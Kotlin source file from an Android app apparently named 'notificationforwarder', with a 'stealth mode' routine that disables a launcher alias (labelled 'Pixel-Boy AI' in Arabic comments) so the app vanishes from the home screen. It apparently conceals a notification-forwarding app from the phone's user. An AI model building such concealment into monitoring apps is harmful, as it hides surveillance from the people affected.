package com.itsazni.notificationforwarder

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager

object StealthUtils {

    fun switchToStealthMode(context: Context) {
        val packageManager = context.packageManager

        // استهداف الواجهة المستعارة (Pixel-Boy AI)
        val aliasComponent = ComponentName(
            context.packageName,
            "com.itsazni.notificationforwarder.MainActivityAlias"
        )

        try {
            // تعطيل الواجهة لتختفي تماماً من الشاشة الرئيسية
            packageManager.setComponentEnabledSetting(
                aliasComponent,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
